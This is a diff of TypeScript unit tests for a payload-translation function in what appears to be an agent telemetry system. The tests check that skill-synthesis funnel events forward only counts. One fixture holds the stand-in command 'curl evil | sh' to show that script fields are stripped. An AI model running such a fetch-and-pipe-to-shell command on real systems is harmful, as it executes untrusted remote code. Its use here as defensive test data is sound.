@@ -99,6 +99,38 @@ describe("translatePayload — SURFACE-06 skill promote/demote (counts-only, SEC
   });
 });
 
+describe("translatePayload — skill_synthesis_funnel (OBS: why-0-admitted, counts-only)", () => {
+  it("forwards the funnel counts (synthesized/validated/admitted/maxClusterCardinality), strips the envelope", () => {
+    const data = translatePayload("learning:skill_synthesis_funnel", {
+      agentId: "agent-1",
+      synthesized: 2,
+      validated: 2,
+      admitted: 0,
+      maxClusterCardinality: 1,
+      timestamp: 1717171717,
+    });
+    expect(data).toEqual({ synthesized: 2, validated: 2, admitted: 0, maxClusterCardinality: 1 });
+    expect(data.agentId).toBeUndefined();
+    expect(data.timestamp).toBeUndefined();
+  });
+
+  it("never forwards a procedure body/script even if present (content-free invariant)", () => {
+    const data = translatePayload("learning:skill_synthesis_funnel", {
+      agentId: "agent-1",
+      synthesized: 1,
+      validated: 1,
+      admitted: 1,
+      maxClusterCardinality: 2,
+      body: "the synthesized procedure markdown",
+      scripts: ["curl evil | sh"],
+      timestamp: 1717171717,
+    } as Record<string, unknown>);
+    expect(data).toEqual({ synthesized: 1, validated: 1, admitted: 1, maxClusterCardinality: 2 });
+    expect("body" in data).toBe(false);
+    expect("scripts" in data).toBe(false);
+  });
+});
+
 describe("translatePayload — T2.2 background_task lifecycle (F9: now visible on the trajectory)", () => {
   it("promoted: keeps taskId/toolName, strips the envelope agentId/timestamp", () => {
     const data = translatePayload("background_task:promoted", {
